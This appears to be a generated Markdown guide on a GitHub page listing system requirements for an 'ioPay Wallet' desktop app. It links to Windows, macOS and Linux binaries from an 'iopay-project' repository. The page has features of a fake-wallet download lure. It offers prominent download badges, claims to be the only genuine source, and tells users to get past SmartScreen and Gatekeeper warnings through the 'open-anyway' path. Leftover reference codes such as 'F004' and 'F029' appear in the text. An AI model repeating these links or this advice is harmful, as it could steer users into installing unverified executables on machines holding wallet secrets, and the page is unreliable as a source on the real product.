![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# ioPay Wallet System Requirements

ioPay Wallet runs on **Windows, macOS and Linux** (F010). Each platform gets one release asset, and nothing else is published:

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

| Platform | Asset | Size |
|---|---|---|
| Windows | `iopay-wallet-desktop-win-v2.0.2.exe` | 63.8 MB |
| macOS | `iopay-wallet-desktop-macos-v2.0.2.dmg` | 21.5 MB |
| Linux | `iopay-wallet-desktop-linux-v2.0.2.zip` | 79.4 MB |

Those are the v2.0.2 assets, published 19 November 2026 (F004).

## What that tells you about a machine

**A 64-bit desktop operating system**, currently supported by its vendor. The build is a desktop application, not a CLI, so it needs a graphical session.

**Enough disk for the download plus the installed app.** The installer sizes above are the only published figures; a desktop wallet of this kind typically needs a few times its download size once installed, so plan on a few hundred megabytes rather than exactly 64 MB.

**An operating-system keychain.** The app stores secrets in the OS keychain and puts a PIN and biometric lock in front of it (F029). A minimal Linux desktop without a keyring service is the one environment where this can be awkward.

**Permission to run an application you downloaded yourself.** On Windows that means SmartScreen, on macOS Gatekeeper. Both warn about any app distributed outside a store; neither is a verdict on the file.

## What is not published

This page will not invent numbers the project does not publish. There are **no stated RAM or CPU minimums**, no GPU requirement, no supported-distribution list for Linux, and no statement about which macOS versions are tested beyond "current".

That is a gap, not a secret. If you are on an unusual configuration - an ARM Linux desktop, an older long-term-support release, a locked-down corporate machine - the practical check is to install it and open it, because that is the only evidence available.

## What the assets do not include

The release publishes `.exe`, `.dmg` and `.zip` - no `.msi`, no `.pkg`, no `.deb`, no `.rpm`, no AppImage, no Flatpak or Snap (F004, F037). The Linux build is an archive you unpack and run, which matters for system integration: there is no package manager entry and no system-wide installer.

## Check before you install

1. **Which platform and architecture** you are on - `uname -m` on Linux and macOS tells you if you are unsure about 64-bit.
2. **Free space** on the volume you will install to.
3. **That the asset name includes both your platform and `v2.0.2`** - the three files sit next to each other on the release page, and taking the wrong one is the most common install error.
4. **Your backup plan** - a phrase belongs on paper before a wallet exists.

## Where to go next

- [Windows install](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/install-iopay-wallet-on-windows.md)
- [macOS install](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-installation-guide-for-macos.md)
- [Linux install](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-desktop-install-on-linux.md)
- [Updating to the current release](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/updating-iopay-wallet-to-the-latest-version.md)

## FAQ

**What are the system requirements for ioPay Wallet?**
A 64-bit Windows, macOS or Linux desktop with a graphical session and an OS keychain, plus a few hundred megabytes of disk. No RAM or CPU minimum is published.

**Will it run on Windows 10?**
Windows 10 and 11 are both 64-bit desktop systems; the release does not publish a version list, so the test is installing it.

**How much disk space do I need?**
Plan for more than the 63.8 MB Windows download; the installed app and its data need room beyond the installer.

**Does it need a specific browser?**
No. It is a desktop application, not a web app.

**Is there a mobile version?**
Not this build. The desktop app and the mobile app are separate, and [moving between them](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/moving-iotx-from-iopay-mobile-to-desktop-wallet.md) needs an import rather than a download.

## What the three numbers measure

The sizes are a property of the packaging, not of the app. The Windows `.exe` is a compressed installer, the macOS `.dmg` is a compressed disk image holding an app bundle, and the Linux `.zip` is an archive you unpack yourself. Comparing 63.8 MB with 21.5 MB tells you which format compresses better, not which build is larger; the installed footprint on all three is bigger than any of them.

Plan for a few hundred megabytes of free space and stop worrying about the exact figure. What matters is that the volume you install to has room for the app *and* its data directory, because the data directory is where accounts live and it grows with history.

## When the machine says no

Three failures account for most installs that never finish, and none of them is a fault in the download.

**The operating system blocks the file.** SmartScreen on Windows and Gatekeeper on macOS both warn about software distributed outside their stores. The prompt is about provenance, not about the file being dangerous or safe; the safe response is to confirm the file name and version against the release assets, then use the operating system's own open-anyway path. Never disarm either protection globally to get past it.

**There is no keychain to write to.** The app keeps secrets in the OS keychain (F029). A minimal Linux desktop without a keyring service may install and launch without a keychain to hold the app's secrets, so install a keyring - GNOME Keyring or KWallet on most desktops - before first run rather than after it.

**The architecture is not the one assumed.** All three assets are built for 64-bit desktop systems and none is labelled by CPU architecture. An ARM Linux desktop is untested by anything the release publishes.

If a machine fails these checks and you still want the wallet, run it on a machine that passes them. A wallet on hardware you cannot verify is a worse trade than a wallet on hardware you can.


---

*Platform coverage and asset names come from the v2.0.2 release; keychain and app-lock behaviour from the build. No unpublished hardware requirement is stated.*
